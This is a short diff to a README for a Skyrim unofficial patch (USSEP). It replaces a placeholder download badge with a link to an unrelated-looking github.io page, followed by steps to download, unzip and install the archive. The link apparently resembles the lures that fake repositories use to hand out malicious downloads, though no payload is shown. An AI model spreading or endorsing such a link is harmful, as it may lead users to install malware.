@@ -8,7 +8,7 @@ USSEP is widely regarded as **essential for any modded Skyrim setup**, ensuring 
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://unofficial-skyrim-patch-windows.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Install with a mod manager (**Vortex, Mod Organizer 2**) or copy files manually into the Skyrim `Data` folder.  
